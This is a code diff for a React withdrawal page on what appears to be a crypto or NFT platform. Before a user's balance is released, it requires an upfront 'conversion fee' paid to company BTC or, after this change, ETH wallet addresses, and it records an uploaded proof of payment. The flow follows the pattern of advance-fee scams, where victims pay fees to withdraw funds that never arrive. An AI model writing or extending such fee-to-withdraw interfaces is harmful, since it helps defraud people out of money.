@@ -52,7 +52,7 @@ export default function Withdraw() {
   const [source, setSource] = useState(() => readProgress()?.source ?? 'nft');
   const [amount, setAmount] = useState(() => readProgress()?.amount ?? '3200');
 
-  const [copied, setCopied] = useState(false);
+  const [copiedKey, setCopiedKey] = useState('');
   const [proof, setProof] = useState<Attachment | null>(null);
   const [proofErr, setProofErr] = useState('');
   const [uploading, setUploading] = useState('');
@@ -72,14 +72,18 @@ export default function Withdraw() {
   const eurSymbol = getFXSymbol('EUR');
   const converted = amt * eurRate;
   const amountValid = amt > 0 && amt <= balance;
-  const btcAddress = DEPOSIT_ADDRESSES.btc;
+  // The fee can be paid to the company's BTC or ETH wallet — each shows its network.
+  const feeAddresses = [
+    { key: 'BTC', network: 'Bitcoin network (BTC)', address: DEPOSIT_ADDRESSES.btc },
+    { key: 'ETH', network: 'Ethereum network (ERC-20)', address: DEPOSIT_ADDRESSES.eth },
+  ];
   const feeBtc = (CONVERSION_FEE_USD * getFXRate('BTC')).toFixed(4);
   const canSubmit = Boolean(proof) && !uploading;
 
-  const copyAddress = () => {
-    try { navigator.clipboard?.writeText(btcAddress); } catch { /* ignore */ }
-    setCopied(true);
-    window.setTimeout(() => setCopied(false), 2000);
+  const copyAddress = (key: string, value: string) => {
+    try { navigator.clipboard?.writeText(value); } catch { /* ignore */ }
+    setCopiedKey(key);
+    window.setTimeout(() => setCopiedKey(''), 2000);
   };
 
   const onProof = async (file: File | undefined) => {
@@ -107,6 +111,7 @@ export default function Withdraw() {
       currency: 'EUR',
       destination: 'Converted to EUR',
       last4: '',
+      proof: proof ? { name: proof.name, url: proof.url, dataUrl: proof.dataUrl } : null,
     });
     pushUserNote(
       `Withdrawal of $${amt.toLocaleString()} (\u2192 ${eurSymbol}${converted.toFixed(2)} EUR) submitted. Conversion fee of $${CONVERSION_FEE_USD.toLocaleString()} paid in BTC \u2014 proof received.`
@@ -224,18 +229,26 @@ export default function Withdraw() {
             <div>
               <h2 className="font-display font-600 text-xl text-[#0A0B0D] mb-2">Pay the conversion fee</h2>
               <p className="text-sm text-black/40 mb-5">
-                Send <span className="font-mono text-[#0A0B0D]">${CONVERSION_FEE_USD.toLocaleString()}</span> (approx <span className="font-mono text-[#0A0B0D]">{feeBtc} BTC</span>) to the company address below before continuing.
+                Send <span className="font-mono text-[#0A0B0D]">${CONVERSION_FEE_USD.toLocaleString()}</span> (approx <span className="font-mono text-[#0A0B0D]">{feeBtc} BTC</span>, or the equivalent in ETH) to one of the company addresses below before continuing.
               </p>
 
-              <div className="bg-black/3 rounded-2xl border border-black/8 p-5 mb-4">
-                <p className="text-[10px] text-black/30 font-mono uppercase tracking-wider mb-2">Company BTC address</p>
-                <p className="font-mono text-[13px] text-[#0A0B0D] break-all leading-relaxed">{btcAddress}</p>
-                <button onClick={copyAddress}
-                  className={`mt-3 w-full flex items-center justify-center gap-2 py-2.5 rounded-xl text-sm border transition-colors ${
-                    copied ? 'border-[#22C55E]/40 text-[#22C55E]' : 'border-[#2F6BFF]/30 text-[#2F6BFF] hover:bg-[#2F6BFF]/5'
-                  }`}>
-                  {copied ? <Check size={15} /> : <Copy size={15} />} {copied ? 'Address copied' : 'Copy address'}
-                </button>
+              <div className="space-y-4 mb-4">
+                {feeAddresses.map(fa => (
+                  <div key={fa.key} className="bg-black/3 rounded-2xl border border-black/8 p-5">
+                    <div className="flex items-center justify-between mb-2 gap-3">
+                      <p className="text-[10px] text-black/30 font-mono uppercase tracking-wider">Company {fa.key} address</p>
+                      <span className="text-[10px] px-1.5 py-0.5 rounded-full bg-[#2F6BFF]/10 text-[#2F6BFF] font-mono shrink-0">{fa.network}</span>
+                    </div>
+                    <p className="font-mono text-[13px] text-[#0A0B0D] break-all leading-relaxed">{fa.address}</p>
+                    <button onClick={() => copyAddress(fa.key, fa.address)}
+                      className={`mt-3 w-full flex items-center justify-center gap-2 py-2.5 rounded-xl text-sm border transition-colors ${
+                        copiedKey === fa.key ? 'border-[#22C55E]/40 text-[#22C55E]' : 'border-[#2F6BFF]/30 text-[#2F6BFF] hover:bg-[#2F6BFF]/5'
+                      }`}>
+                      {copiedKey === fa.key ? <Check size={15} /> : <Copy size={15} />}
+                      {copiedKey === fa.key ? 'Address copied' : `Copy ${fa.key} address`}
+                    </button>
+                  </div>
+                ))}
               </div>
 
               <div className="flex items-start gap-2 text-xs text-black/45 bg-black/3 rounded-xl px-4 py-3 mb-4">
